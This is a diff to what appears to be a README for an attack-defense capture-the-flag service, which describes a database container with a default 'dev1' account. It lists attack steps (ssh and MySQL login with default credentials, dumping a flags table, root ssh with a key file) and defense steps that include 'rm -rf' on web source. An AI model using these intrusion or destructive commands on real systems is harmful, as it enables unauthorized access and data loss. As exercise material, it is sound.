@@ -14,36 +14,48 @@ db docker is configured attending to the following tips:
  'dev1' user will never be changed, but password can be changed. Moreover, it has also the same user and password for the database. 
  
 -Flags: 
-    Flags will be stored in 'pasapasa_db_1' docker's flags in faulty_db database and flags table. 
+    Flags will be stored in 'webdatubasea_db_1' docker's flags in faulty_db database and flags table. 
 
 # About exploting:
 - The attacker can use the web to find the flag in the table or create a new db user and get the flag from terminal.
 - The defender should change 'dev1' user's password. It has to change dev1 db user password and remove all the users created. It cas to remove or restrict access to create_user.php and show_info.php.
   
-  Attack performed by Team1 against Team 4. 
-  Inspect web page in 10.0.0.104
-      We find 'dev1/w3ar3h4ck3r2' credentials.
-  ssh -p 8822 dev1@10.0.0.104
-        Enter 'w3ar3h4ck3r2' as password
-  cat /tmp/flags.txt
+  Attack performed by Team1 against Team 2. 
+  Inspect web page in 10.0.1.101
+      We can create user.
+      We can check flags.
+  ssh -p 2222 dev1@10.0.1.101
+        Enter 'dev1_password' as password
+  mysql -h 10.0.1.101 -P 3306 -u dev1 -p
+  USE faulty_db;
+  SELECT * FROM flags;
      Copy last flags
      Exit
+
+     Aldatu....
   'ssh -i /home/urko/Deskargak/keyak/team2-sshkey root@10.0.1.1'
   nano /root/xxx.flag
     Paste copied flags. 
+    ...
 
-  Defense performed by Team4
-     'ssh root@10.0.0.104'
-     docker exec -it pasapasa_ssh_1 /bin/bash
+  Defense performed by Team2
+     'ssh root@10.0.0.102'
+     docker exec -it webdatubasea_web_1 /bin/bash
      passwd dev1
+     rm -rf /var/www/html/src/*
+
+     mysql -h 10.0.1.101 -P 3306 -u dev1 -p
+     SET PASSWORD FOR 'dev1'@'%' = PASSWORD('new_password');
+     SELECT User, Host FROM mysql.user;
+     DROP USER 'username'@'host';
+
      
 
 # Checker checks:
 - Ports to reach dockers are open (WEB:80)
 - User 'dev1' exists in webdatubasea_web docker. 
 - User 'dev1' exists in webdatubasea_db docker. 
-- User 'root' exists in webdatubasea_db docker. 
-- /etc/sshd_config file from webdatubasea_web docker has not been changed. 
+- User 'root' exists in webdatubasea_db docker.
 - /var/www/html/index.html file's content from webdatubasea_web docker has not been changed. 
 
 
